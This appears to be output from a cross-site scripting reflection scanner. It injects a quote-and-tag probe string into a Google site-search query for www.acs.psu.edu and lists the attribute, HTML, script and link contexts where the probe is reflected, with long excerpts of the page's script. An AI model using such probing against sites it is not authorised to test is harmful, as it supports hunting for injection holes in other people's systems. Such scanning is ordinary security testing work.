@@ -1,0 +1,945 @@
+https://www.acs.psu.edu
+
+GET Params:[4]
+['q', 'as_sitesearch', 'ie', 'oe']
+_______________________________________________________________________________________________________
+https://www.google.com/search?q=(uvw"xyz'yxz</zxy&as_sitesearch=www.acs.psu.edu
+
+----------------------------------------------------------------------------------
+Attribute Context: [2]
+<input class="gLFyf gsfi" maxlength="2048" name="q" type="text" jsaction="paste:puy29d" aria-autocomplete="both" aria-haspopup="false" autocapitalize="off" autocomplete="off" autocorrect="off" role="combobox" spellcheck="false" title="Search" value='(uvw"xyz&#39;yxz&lt;/zxy site:www.acs.psu.edu' aria-label="Search" data-ved="0ahUKEwjdkt7vpuXoAhW0xzgGHRnBC_cQ39UDCAk">
+<div jsdata="GXYZuf;;BbMdNM" jscontroller="G3eKy" jsl="$t t-w-XilABeKRA;$x 0;" class="r-iwhhIk0Jhqkg">
+
+----------------------------------------------------------------------------------
+HTML Context: [2]
+<title>(uvw"xyz'yxz&lt;/zxy site:www.acs.psu.edu - Google Search</title>
+<em>(uvw&quot;xyz&#39;yxz&lt;/zxy site:www.acs.psu.edu</em>
+
+----------------------------------------------------------------------------------
+Script Context: [1]
+<script nonce="jy1RFyy4FWQYxO7lyn/8WQ==">(function(){google.ldi={};google.pim={};})();(function(){var u='/xjs/_/js/k\x3dxjs.s.en_GB.YlbWwcv8Rzo.O/ck\x3dxjs.s._psGpbc7COU.L.W.O/m\x3dFkg7bd,HcFEGb,IvlUe,MC8mtf,OF7gzc,RMhBfe,T4BAC,TJw5qb,TbaHGc,Y33vzc,ZyRBae,cdos,hsm,iDPoPb,jsa,mvYTse,tg8oTe,uz938c,vWNDde,ws9Tlc,yQ43ff,d,csi/am\x3dAAQAAMASgF13AJz_TQAAF8w4AAAggBvBxgIpIqEgAAGsuggCAQ/d\x3d1/dg\x3d2/ct\x3dzgms/rs\x3dACT90oGH5qsv6t9wsw0xPVUy40iHVnuuOQ';
+setTimeout(function(){var b=document;var a="SCRIPT";"application/xhtml+xml"===b.contentType&&(a=a.toLowerCase());a=b.createElement(a);a.src=u;google.timers&&google.timers.load&&google.tick&&google.tick("load","xjsls");document.body.appendChild(a)},0);})();(function(){window.google.xjsu='/xjs/_/js/k\x3dxjs.s.en_GB.YlbWwcv8Rzo.O/ck\x3dxjs.s._psGpbc7COU.L.W.O/m\x3dFkg7bd,HcFEGb,IvlUe,MC8mtf,OF7gzc,RMhBfe,T4BAC,TJw5qb,TbaHGc,Y33vzc,ZyRBae,cdos,hsm,iDPoPb,jsa,mvYTse,tg8oTe,uz938c,vWNDde,ws9Tlc,yQ43ff,d,csi/am\x3dAAQAAMASgF13AJz_TQAAF8w4AAAggBvBxgIpIqEgAAGsuggCAQ/d\x3d1/dg\x3d2/ct\x3dzgms/rs\x3dACT90oGH5qsv6t9wsw0xPVUy40iHVnuuOQ';})();function _DumpException(e){throw e;}
+function _F_installCss(c){}
+(function(){google.spjs=false;google.snet=true;google.em=[];google.emw=false;google.pdt=0;google.uwp=false;})();(function(){var pmc='{\x22Fkg7bd\x22:{},\x22HcFEGb\x22:{},\x22IvlUe\x22:{},\x22MC8mtf\x22:{},\x22OF7gzc\x22:{},\x22RMhBfe\x22:{},\x22T4BAC\x22:{},\x22TJw5qb\x22:{},\x22TbaHGc\x22:{},\x22Y33vzc\x22:{},\x22ZyRBae\x22:{},\x22aa\x22:{},\x22abd\x22:{\x22abd\x22:false,\x22deb\x22:false,\x22det\x22:false},\x22async\x22:{},\x22bgd\x22:{\x22ac\x22:true,\x22as\x22:true,\x22at\x22:0,\x22ea\x22:true,\x22ed\x22:0,\x22ei\x22:true,\x22el\x22:true,\x22ep\x22:true,\x22er\x22:true,\x22et\x22:0,\x22eu\x22:false,\x22wl\x22:false},\x22cdos\x22:{\x22cdobsel\x22:false},\x22csi\x22:{},\x22d\x22:{},\x22ddls\x22:{},\x22dvl\x22:{\x22cookie_secure\x22:true,\x22cookie_timeout\x22:86400,\x22driver_ui_type\x22:2,\x22jsc\x22:\x22[null,null,null,30000,null,null,null,2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[\\\x2286400000\\\x22,\\\x22604800000\\\x22,2.0]\\n,null,1]\\n\x22,\x22mnr_crd\x22:\x221\x22,\x22msg_dsc\x22:\x22From your Internet address\x22,\x22msg_dsc_url\x22:\x22\x22,\x22msg_dvl\x22:\x22From your device\x22,\x22msg_err\x22:\x22Location unavailable\x22,\x22msg_gps\x22:\x22Using GPS\x22,\x22msg_unk\x22:\x22Unknown\x22,\x22msg_upd\x22:\x22Update location\x22,\x22msg_use\x22:\x22Use precise location\x22,\x22uul_text\x22:\x22Lahore\x22},\x22foot\x22:{\x22pf\x22:true,\x22po\x22:true,\x22qe\x22:false},\x22gf\x22:{\x22pid\x22:196},\x22hsm\x22:{},\x22iDPoPb\x22:{},\x22jsa\x22:{\x22csi\x22:true,\x22csir\x22:100},\x22kyn\x22:{},\x22llc\x22:{},\x22lu\x22:{},\x22m\x22:{},\x22mUpTid\x22:{},\x22mpck\x22:{\x22me\x22:false},\x22mu\x22:{\x22murl\x22:\x22https://adservice.google.com/adsid/google/ui\x22},\x22mvYTse\x22:{},\x22sb_wiz\x22:{\x22rfs\x22:[],\x22stok\x22:\x22MYeQdxxX_riOdkEyQKAM4eJOsXQ\x22},\x22sf\x22:{},\x22sonic\x22:{},\x22spch\x22:{\x22ae\x22:\x22Please check your microphone.  \\u003Ca href\x3d\\\x22https://support.google.com/chrome/?p\x3dui_voice_search\\\x22 target\x3d\\\x22_blank\\\x22\\u003ELearn more\\u003C/a\\u003E\x22,\x22hl\x22:\x22en-PK\x22,\x22im\x22:\x22Click \\u003Cb\\u003EAllow\\u003C/b\\u003E to start voice search\x22,\x22iw\x22:\x22Waiting...\x22,\x22lm\x22:\x22Listening...\x22,\x22lu\x22:\x22%1$s voice search not available\x22,\x22mb\x22:false,\x22ne\x22:\x22No Internet connection\x22,\x22nt\x22:\x22Didn\x27t get that. \\u003Cspan\\u003ETry again\\u003C/span\\u003E\x22,\x22nv\x22:\x22Please check your microphone and audio levels.  \\u003Ca href\x3d\\\x22https://support.google.com/chrome/?p\x3dui_voice_search\\\x22 target\x3d\\\x22_blank\\\x22\\u003ELearn more\\u003C/a\\u003E\x22,\x22pe\x22:\x22Voice search has been turned off.  \\u003Ca href\x3d\\\x22https://support.google.com/chrome/?p\x3dui_voice_search\\\x22 target\x3d\\\x22_blank\\\x22\\u003EDetails\\u003C/a\\u003E\x22,\x22rm\x22:\x22Speak now\x22},\x22tg8oTe\x22:{},\x22tl\x22:{\x22rvkey\x22:\x22AIzaSyC_9Rt88UMjzgg5pIVArnfuIVkJx4zCdTY\x22},\x22uz938c\x22:{},\x22vWNDde\x22:{},\x22vs\x22:{},\x22ws9Tlc\x22:{},\x22yQ43ff\x22:{}}';google.pmc=JSON.parse(pmc);})();(function(){var r=['sb_wiz','aa','abd','async','bgd','dvl','foot','kyn','lu','m','mUpTid','mpck','mu','sf','sonic','spch','tl','vs','exdc'];google.plm(r);})();(function(){var m=[[["root",[["t-w-XilABeKRA","iwhhIk0Jhqkg","r-iwhhIk0Jhqkg",null,null,"exdc"]
+]
+,""]
+]
+]
+;google.jsc&&google.jsc.m(m);google.log('rfl','');})();(function(){var m=['BbMdNE','[\x22psy-ab\x22,\x22gws-wiz\x22,\x22(uvw\\\x22xyz\x27yxz\\u003c/zxy site:www.acs.psu.edu\x22,\x22\x22,null,1,0,0,11,\x22en\x22,\x22MYeQdxxX_riOdkEyQKAM4eJOsXQ\x22,\x22\x22,\x22qE2UXt2eG7SP4-EPmYKvuA8\x22,0,\x22en-PK\x22,null,null,null,0,null,null,3,5,null,null,0,-1,0,0,0,\x22\x22,0,0,\x22\x22,null,0,null,0,null,\x22/suggest\x22,0,0,0,0,0]\n','BbMdNI','[0,0,0,[null,null,[[[3,null,null,[null,[[\x22qdr_\x22,1,6]\n,[\x22qdr_h\x22,0,6]\n,[\x22qdr_d\x22,0,6]\n,[\x22qdr_w\x22,0,6]\n,[\x22qdr_m\x22,0,6]\n,[\x22qdr_y\x22,0,6]\n,[\x22cdr_opt\x22,0,1,[1,\x22Custom range...\x22,null,\x22cdr:1,cd_min:x,cd_max:x\x22,\x22\x22,\x22text\x22,\x22\x22,\x22\x22,6,1,[[[\x22q\x22,\x22(uvw\\\x22xyz\x27yxz\\u003c/zxy site:www.acs.psu.edu\x22]\n]\n]\n,\x22cdr_opt\x22,\x225/23/2004\x22,0]\n]\n]\n,0]\n]\n,[3,null,null,[null,[[\x22li_\x22,1,6]\n,[\x22li_1\x22,0,6]\n]\n,1]\n]\n]\n,null,[\x22tbs\x22]\n]\n]\n,null,null,[null,[[\x22/search?q\\u003d(uvw%22xyz%27yxz%3C/zxy+site:www.acs.psu.edu\\u0026source\\u003dlnms\x22,null,null,\x22All\x22,1,null,1,null,null,\x22WEB\x22,[0,2]\n,null,null,0]\n,[\x22/search?q\\u003d(uvw%22xyz%27yxz%3C/zxy+site:www.acs.psu.edu\\u0026source\\u003dlnms\\u0026tbm\\u003disch\x22,null,null,\x22Images\x22,0,null,1,null,null,\x22IMAGES\x22,[6,2]\n,null,null,6]\n,[\x22/search?q\\u003d(uvw%22xyz%27yxz%3C/zxy+site:www.acs.psu.edu\\u0026source\\u003dlnms\\u0026tbm\\u003dvid\x22,null,null,\x22Videos\x22,0,null,1,null,null,\x22VIDEOS\x22,[13,2]\n,null,null,13]\n,[\x22/search?q\\u003d(uvw%22xyz%27yxz%3C/zxy+site:www.acs.psu.edu\\u0026source\\u003dlnms\\u0026tbm\\u003dnws\x22,null,null,\x22News\x22,0,null,1,null,null,\x22NEWS\x22,[10,2]\n,null,null,10]\n]\n,[[\x22/search?q\\u003d(uvw%22xyz%27yxz%3C/zxy+site:www.acs.psu.edu\\u0026source\\u003dlnms\\u0026tbm\\u003dbks\x22,null,null,\x22Books\x22,0,null,1,null,null,\x22BOOKS\x22,[2,2]\n,null,null,2]\n,[\x22/search?q\\u003d(uvw%22xyz%27yxz%3C/zxy+site:www.acs.psu.edu\\u0026source\\u003dlnms\\u0026tbm\\u003dfin\x22,null,null,\x22Finance\x22,0,null,1,null,null,\x22FINANCE\x22,[22,2]\n,null,null,22]\n]\n]\n,null,1]\n','BbMdNM','[0,\x22inline\x22,2,2500,0,0]\n','BbMdNQ','[null,null,1,30000,null,null,null,2,null,null,3,null,null,null,null,null,1,null,null,null,null,null,null,[31.506432,74.3473152]\n,null,null,null,null,0,null,null,null,null,null,null,null,0,\x221586777512\x22,null,null,null,null,null,1,null,null,[\x2286400000\x22,\x22604800000\x22,2.0]\n,null,1]\n','BbMdNU','[\x22https://www.google.com.pk/domainless/read?igu\\u003d1\x22,\x22AFz9ztslWrFhBfcjqhNP_Nf5SRSmehUZZg:1586777512610\x22,3]\n','BbMdNY','[1,null,null,1261,1349,0]\n'];
+var a=m;window.W_jd=window.W_jd||{};for(var b=0;b<a.length;b+=2)window.W_jd[a[b]]=JSON.parse(a[b+1]);})();(function(){window.WIZ_global_data={"Yllh3e":"%.@.1586777512446301,104384436,4144742681]\n","zChJod":"%.@.]\n","pxO4Zd":"0","GWsdKe":"en-PK","SIsrTd":"false","LU5fGb":"false","w2btAe":"%.@.\"\",\"\",\"0\",null,null,null,1]\n","eptZe":"/_/WizRpcUi/","mXOY5d":"%.@.null,1]\n","fyLpDc":"","SsQ4x":"jy1RFyy4FWQYxO7lyn/8WQ\u003d\u003d","KdGe5c":"false","rRLesf":"0","VnH1Zb":"normal","tqXjO":"false","JVBnre":"false","WxHUzd":"true","FiZWae":"32","eGDqv":"false","ZMFELd":"false","haqSDf":"rgba(0,0,0,.54)","AwPxw":"false","z1x4kc":"true","eE52Jd":"#5f6368","KVmtZc":"rgba(255,255,255,.3)","lzJv9d":"#fff","S7nbec":"16","PxA5sf":"rgba(0,0,0,.54)","HjM8R":"#FFF","iniaFd":"true","lLCPB":"true","rZYUef":"#f5f5f5","KgXmrd":"true","buGAI":"16","qj36Ef":"#323232","PngPbb":"rgba(0,0,0,.87)","B0husb":"true","aKuscd":"#AECBFA","FYBlgf":"false","SpZHZd":"true","rX9Pnb":"16","b1KZw":"#fff","X4yPd":"#1c3aa9","QA73ad":"false","n1Whrf":"false","qkXvHd":"500","BoqNoc":"20px","kePaAc":"-4","LACYrf":"false","zHtpPb":"false","NvsKMd":"true","R9GQh":"#fff","KnXmRc":"10","iwHJId":"15","SuQiSc":"1.3","SfSmD":"#ebebeb","H7aRye":"0px 5px 26px 0px rgba(0, 0, 0, 0.22), 0px 20px 28px 0px rgba(0, 0, 0, 0.30)","gir54":"0.4","fjc61":"false","ekXXzb":"13px","iDTSkb":"true","SidP2e":"rgba(248, 248, 248, 0)","QldWK":"6","kvKIW":"false","zhkRO":"%.@.1,1,1,1,1,1,0,0,0,1]\n","gbf9Eb":"58","UnFEre":"16","g635Ab":"2px","LnZAkd":"false","A2aVpb":"50","tqmosb":"#fff","wB1JTc":"false","YWHUvb":"18px","BdVmgf":"16","xT28q":"false","TUhOL":"#fafafa","VQfWj":"#c0c0c0","fFepd":"-15","F4ULTd":"true","q7vEEb":"false","JyBo2c":"false","pxDH4c":"#0f9d58","Ym5Ycb":"false","OqjdAf":"true","owXwYb":"#f8f8f8","I69zkb":"rgba(204,204,204,.25)","FbN3Qc":"rgba(0,0,0,.87)","WMBRj":"#009688","auaxA":"#222","a7rhWc":"false","GTYTQ":"#ffeb3b","uRoR4d":"false","pLhKvc":"0","V0Bluc":"none","Vzh4p":"0px 7px 6px -5px #DFE1E5","FF58Bf":"true","nMRhJe":"false","hbfefd":"#1A73E8","JRGsye":"none","srQSvc":"true","AYVQWe":"20px","MOPyub":"15","MoAfyf":"#fff","u4NTBb":"40","TKn0F":"20px","aUt4Tc":"false","RpI44b":"#ebebeb","s6Rzec":"0 16px","rWPbFe":"rgba(255,255,255,1)","kkVYtc":"false","osNyZ":"1.0","NW4nA":"rgba(255,255,255,.7)","a8Umdd":"rgba(153,153,153,.4)","BYw9f":"false","Nk1Bhf":"#4285f4","IfHuyb":"rgba(0,0,0,.54)","z70S0c":"false","o9mzkf":"false","xBx7Dc":"36","PYrjqe":"40","iKzRxb":"#5f6368","zhBJde":"false","khoEPb":"#1a0dab","X1bUEc":"arial,sans-serif-medium,sans-serif","xvI8we":"#212121","ruHO7c":"#dd191d","y2Hs7d":"false","e2p8ee":"false","xFbXr":"rgba(0,102,33,1)","QSF9Ec":"","PuOePe":"false","bmQ7Rb":"false","Dc0uuf":"16","WyvaRd":"0 1px 1px rgba(0,0,0,.16)","sPiebd":"false","hqg9c":"#1878f0","o07h3e":"0 4px 5px rgba(0,0,0,.16)","bDOvJc":"false","ZxI7Af":"#fafafa","ib0wve":"rgba(153,153,153,.2)","j9ZYRc":"true","gjAni":"#3c4043","v44rSc":"#70757a","Utapxe":"-webkit-","D8A8he":"true","UduJSb":"%.@.\"0 0\",0,0,20,20,\"/images/searchbox/desktop_searchbox_sprites302_hr.png\",\"20px\"]\n","i7mh3e":"16","Fcb4A":"#1A73E8","S1ZUDf":"true","wFGKdc":"false","pPtK5":"6","yFVHo":"true","UNVSy":"false","FydCC":"true","OjG6Qc":"#000","fQC6Cf":"2px","EiEfXb":"#ebebeb","WnrBce":"rgba(0,0,0,.1)","HWmJg":"#dcdcdc","Tae7A":"true","jIrJIf":"14","qmiCId":"true","Na6wt":"#e1e1e1","abZ6pc":"#f9a825","jg5SCd":"false","ZzVVh":"false","QnH6ad":"16","hgWJ8c":"false","WWz0vd":"false","T1V3fc":"#f4b400","kVbEH":"false","wlwuHd":"false","KFdH8":"true","AQEr7b":"#c6c6c6","cdRSXc":"false","XgWQKd":"true","k7G1xb":"15","IvNqzc":"true","ToXxme":"#e5e5e5","wku5sd":"false","Sgnmlc":"14px","QDXUyc":"#188038","X4DPRd":"true","oFa0q":"#fafafa","Vdtb3d":"true","EgTnfe":"true","klgere":"invert(1) hue-rotate(180deg)","pDiOce":"false","dTMnbc":"false","AYXCHc":"false","KD9WYe":"#1A73E8","L6WyEf":"true","NIYCKf":"28","SezQgf":"500","GzC2p":"#fff","SATNMc":"1px solid #dfe1e5","tJ4Jdf":"11","ymIfqf":"18","ENmP1c":"rgba(204,204,204,.15)","xz9C5b":"true","hWyTvf":"false","ppkaeb":"0","qDYzS":"0 2px 10px 0 rgba(0,0,0,0.2)","BwgO5":"16","EqX55c":"652","JcUGee":"rgba(0,0,0,.54)","dAFa0e":"false","JpB3Ue":"60","bXvyY":"#fff","lVRwic":"false","fRkoq":"true","p7BdKe":"true","vhCwfc":"false","OQZvxe":"0 2px 10px 0 rgba(0,0,0,0.2)","ODgkgd":"#fff","EuCkcd":"16","VbmVYd":"true","PPUcAe":"0px 0px 8px rgba(32, 33, 36, .24)","pch72b":"false","W445Dc":"20","MiTaT":"#1A73E8","aD6AQe":"#757575","rx1dvd":"#f3f3f3","LIYDac":"arial,sans-serif","YXGVrd":"true","tpLZye":"#fff","mJempe":"13","gqXETb":"#db4437","j0DpSe":"false","iryGqc":"2","in3Ilb":"#222","V6eh7c":"16","PIn0Ab":"1px solid #DFE1E5","oyB9kf":"rgba(0,0,0,.87)","imHXAf":"true","voc95c":"false","BW8dtd":"rgba(248, 248, 248, 1)","KTkDB":"false","Hzi6pf":"#DFE1E5","Mlljec":"false","ZLr84e":"true","B8Dib":"rgba(0,0,0,.87)","AEMHld":"#eeeeee","eo8dye":"#878787","kL6Xwb":"false","Rnt1Qc":"false","A5tF3b":"false","h29koe":"32","sBpVac":"rgba(0,0,0,.26)","ConpTc":"false","prFQBe":"#ebebeb","y519we":"true","rsd6be":"1","AP8pqf":"rgba(0,0,0,.12)","RZ03Ve":"#5677fc","bVUXme":"25","tyCgpc":"#fff","xeVOLe":"#689f38","y1HZEd":"false","eXPt4e":"400","o28sBd":"false","N31mf":"false","seVajd":"rgba(0,0,0,.12)","By1ejd":"16","RJegIe":"#fffff0","EJG4vf":"pointer","vIMrp":"true","K2vQjf":"#f8f8f8","umYEvb":"false","xDKXr":"false","tuTJ6d":"#b8b8b8","ue6nDb":"Roboto-Medium,Roboto-Regular","U6xP0":"#4285f4","VXIo7d":"8px","bmAEG":"#d9d9d9"};window.IJ_values=["#fff","rgba(0,102,33,1)","rgba(0,0,0,.87)","rgba(0,0,0,.54)","rgba(255,255,255,1)","rgba(255,255,255,.7)",false,"%.@.\"\",\"\",\"0\",null,null,null,1]\n","0","%.@.null,1]\n","%.@.]\n","jy1RFyy4FWQYxO7lyn/8WQ\u003d\u003d","%.@.\"0 0\",0,0,20,20,\"/images/searchbox/desktop_searchbox_sprites302_hr.png\",\"20px\"]\n","en-PK",false,"","%.@.1586777512446301,104384436,4144742681]\n",false,"/_/WizRpcUi/"];})();google.x(null, function(){(function(){(function(){google.csct={};google.csct.ps='AOvVaw3zn61Mh1ItFG9PJBHd6YXd\x26ust\x3d1586863912495014';})();})();(function(){(function(){google.csct.pi=true;})();})();(function(){(function(){
+function f(){for(var c="&cshid="+google.cshid,d=document.querySelectorAll('[href^="/"]'),e=0,b;b=d[e++];){var a=b.getAttribute("href");a.match(/[\?|&](ei|ved)=/)&&-1==a.indexOf("cshid=")&&(-1==a.search("#")?b.setAttribute("href",a+c):(a=a.split("#"),b.setAttribute("href",a[0]+c+"#"+a[1])))}d=document.querySelectorAll("[ping]");for(e=0;b=d[e++];)a=b.getAttribute("ping"),-1==a.indexOf("cshid=")&&b.setAttribute("ping",a+c)};google.csh=google.csh||{};google.csh.ict=function(c){google.cshid&&(c&&window.MutationObserver?google.dclc(function(){(new MutationObserver(f)).observe(document.querySelector("body"),{attributes:!0,childList:!0,subtree:!0,characterData:!0})}):google.dclc(f))};}).call(this);})();(function(){(function(){var umo=false;google.csh.ict(umo);})();})();(function(){window.jsl=window.jsl||{};window.jsl.dh=window.jsl.dh||function(i,c,d){try{var e=document.getElementById(i);if(e){e.innerHTML=c;if(d){d();}}else{if(window.jsl.el){window.jsl.el(new Error('Missing ID.'),{'id':i});}}}catch(e){if(window.jsl.el){window.jsl.el(new Error('jsl.dh'));}}};})();(function(){window.jsl.dh('hdtbMenus','\x3cdiv class\x3d\x22hdtb-mn-cont\x22\x3e\x3cdiv id\x3d\x22XJDHvf\x22\x3e\x3c/div\x3e\x3cdiv class\x3d\x22hdtb-mn-hd\x22 aria-haspopup\x3d\x22true\x22 role\x3d\x22button\x22 tabindex\x3d\x220\x22\x3e\x3cdiv class\x3d\x22mn-hd-txt\x22\x3eAny time\x3c/div\x3e\x3cspan class\x3d\x22mn-dwn-arw\x22\x3e\x3c/span\x3e\x3c/div\x3e\x3cul class\x3d\x22hdtbU hdtb-mn-c\x22\x3e\x3cli class\x3d\x22hdtbItm hdtbSel\x22 id\x3d\x22qdr_\x22 tabindex\x3d\x220\x22\x3eAny time\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_h\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3d(uvw%22xyz%27yxz%3C/zxy+site:www.acs.psu.edu\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:h\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjdkt7vpuXoAhW0xzgGHRnBC_cQpwV6BAgBEBY\x22\x3ePast hour\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_d\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3d(uvw%22xyz%27yxz%3C/zxy+site:www.acs.psu.edu\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:d\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjdkt7vpuXoAhW0xzgGHRnBC_cQpwV6BAgBEBc\x22\x3ePast 24 hours\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_w\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3d(uvw%22xyz%27yxz%3C/zxy+site:www.acs.psu.edu\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:w\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjdkt7vpuXoAhW0xzgGHRnBC_cQpwV6BAgBEBg\x22\x3ePast week\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_m\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3d(uvw%22xyz%27yxz%3C/zxy+site:www.acs.psu.edu\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:m\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjdkt7vpuXoAhW0xzgGHRnBC_cQpwV6BAgBEBk\x22\x3ePast month\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_y\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3d(uvw%22xyz%27yxz%3C/zxy+site:www.acs.psu.edu\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:y\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjdkt7vpuXoAhW0xzgGHRnBC_cQpwV6BAgBEBo\x22\x3ePast year\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22vjyzWd\x22\x3e\x3cdiv jscontroller\x3d\x22Uuupec\x22 data-m\x3d\x22true\x22\x3e\x3cspan class\x3d\x22q\x22 id\x3d\x22cdrlnk\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22EEGHee\x22 data-ved\x3d\x222ahUKEwjdkt7vpuXoAhW0xzgGHRnBC_cQpwV6BAgBEBs\x22\x3eCustom range...\x3c/span\x3e\x3cdiv class\x3d\x22n5Ug4b\x22 style\x3d\x22display:none\x22\x3e\x3cdiv class\x3d\x22vOvh1b\x22 jsaction\x3d\x22xp3IKd\x22\x3e\x3c/div\x3e\x3cdiv class\x3d\x22J6UZg\x22\x3e\x3cdiv class\x3d\x22Jy9Ore\x22\x3eCustomised date range\x3c/div\x3e\x3clabel class\x3d\x22Qtsmnf tmDYm\x22 for\x3d\x22OouJcb\x22\x3eFrom\x3c/label\x3e\x3clabel class\x3d\x22Qtsmnf iWBKNe\x22 for\x3d\x22rzG2be\x22\x3eTo\x3c/label\x3e\x3cdiv class\x3d\x22Gwgzqd\x22 role\x3d\x22button\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22xp3IKd\x22\x3e\x3c/div\x3e\x3cdiv class\x3d\x22NwEGxd\x22\x3e\x3cdiv class\x3d\x22qomYCd\x22\x3e\x3c/div\x3e\x3cform action\x3d\x22/search\x22 class\x3d\x22T3kYXe\x22 method\x3d\x22get\x22\x3e\x3cinput name\x3d\x22q\x22 value\x3d\x27(uvw\x22xyz\x26#39;yxz\x26lt;/zxy site:www.acs.psu.edu\x27 type\x3d\x22hidden\x22\x3e\x3cinput name\x3d\x22source\x22 type\x3d\x22hidden\x22 value\x3d\x22lnt\x22\x3e\x3cinput value\x3d\x22cdr:1,cd_min:x,cd_max:x\x22 id\x3d\x22HjtPBb\x22 name\x3d\x22tbs\x22 type\x3d\x22hidden\x22\x3e\x3cinput value\x3d\x22\x22 name\x3d\x22tbm\x22 type\x3d\x22hidden\x22\x3e\x3cinput class\x3d\x22OouJcb ktf mini\x22 type\x3d\x22text\x22 value\x3d\x22\x22 autocomplete\x3d\x22off\x22 id\x3d\x22OouJcb\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22focus:daRB0b\x22\x3e\x3cinput class\x3d\x22rzG2be ktf mini\x22 type\x3d\x22text\x22 value\x3d\x22\x22 autocomplete\x3d\x22off\x22 id\x3d\x22rzG2be\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22focus:daRB0b\x22\x3e\x3cinput class\x3d\x22Ru1Ao ksb mini\x22 value\x3d\x22Go\x22 tabindex\x3d\x220\x22 type\x3d\x22submit\x22 jsaction\x3d\x22tnv.scf\x22\x3e\x3c/form\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e\x3c/li\x3e\x3c/ul\x3e\x3cspan class\x3d\x22hQKUmb\x22\x3e\x3c/span\x3e\x3cdiv class\x3d\x22hdtb-mn-hd\x22 aria-haspopup\x3d\x22true\x22 role\x3d\x22button\x22 tabindex\x3d\x220\x22\x3e\x3cdiv class\x3d\x22mn-hd-txt\x22\x3eAll results\x3c/div\x3e\x3cspan class\x3d\x22mn-dwn-arw\x22\x3e\x3c/span\x3e\x3c/div\x3e\x3cul class\x3d\x22hdtbU hdtb-mn-c\x22\x3e\x3cli class\x3d\x22hdtbItm hdtbSel\x22 id\x3d\x22li_\x22 tabindex\x3d\x220\x22\x3eAll results\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22li_1\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3d(uvw%22xyz%27yxz%3C/zxy+site:www.acs.psu.edu\x26amp;source\x3dlnt\x26amp;tbs\x3dli:1\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjdkt7vpuXoAhW0xzgGHRnBC_cQpwV6BAgBEB4\x22\x3eVerbatim\x3c/a\x3e\x3c/li\x3e\x3c/ul\x3e\x3cspan class\x3d\x22hQKUmb\x22\x3e\x3c/span\x3e\x3c/div\x3e');})();(function(){google.drty&&google.drty();})();});</script>
+
+----------------------------------------------------------------------------------
+URI Context: [12]
+<a href="/search?q=(uvw%22xyz%27yxz%3C/zxy+site:www.acs.psu.edu&amp;gbv=1&amp;sei=qE2UXt2eG7SP4-EPmYKvuA8">
+<a class="gb_4 gb_5 gb_he gb_1c" href="https://accounts.google.com/ServiceLogin?hl=en&amp;passive=true&amp;continue=https://www.google.com/search%3Fq%3D(uvw%2522xyz%27yxz%253C/zxy%26as_sitesearch%3Dwww.acs.psu.edu" target="_top">
+<a class="q qs" href="/search?q=(uvw%22xyz%27yxz%3C/zxy+site:www.acs.psu.edu&amp;source=lnms&amp;tbm=isch&amp;sa=X&amp;ved=2ahUKEwjdkt7vpuXoAhW0xzgGHRnBC_cQ_AUoAXoECAEQAw">
+<a class="q qs" href="/search?q=(uvw%22xyz%27yxz%3C/zxy+site:www.acs.psu.edu&amp;source=lnms&amp;tbm=vid&amp;sa=X&amp;ved=2ahUKEwjdkt7vpuXoAhW0xzgGHRnBC_cQ_AUoAnoECAEQBA">
+<a class="q qs" href="/search?q=(uvw%22xyz%27yxz%3C/zxy+site:www.acs.psu.edu&amp;source=lnms&amp;tbm=nws&amp;sa=X&amp;ved=2ahUKEwjdkt7vpuXoAhW0xzgGHRnBC_cQ_AUoA3oECAEQBQ">
+<a class="f9UGee q qs" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/search?q=(uvw%22xyz%27yxz%3C/zxy+site:www.acs.psu.edu&amp;source=lnms&amp;tbm=bks&amp;sa=X&amp;ved=2ahUKEwjdkt7vpuXoAhW0xzgGHRnBC_cQ_AUoAHoECAEQBw">
+<a class="f9UGee q qs" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/search?q=(uvw%22xyz%27yxz%3C/zxy+site:www.acs.psu.edu&amp;source=lnms&amp;tbm=fin&amp;sa=X&amp;ved=2ahUKEwjdkt7vpuXoAhW0xzgGHRnBC_cQ_AUoAXoECAEQCA">
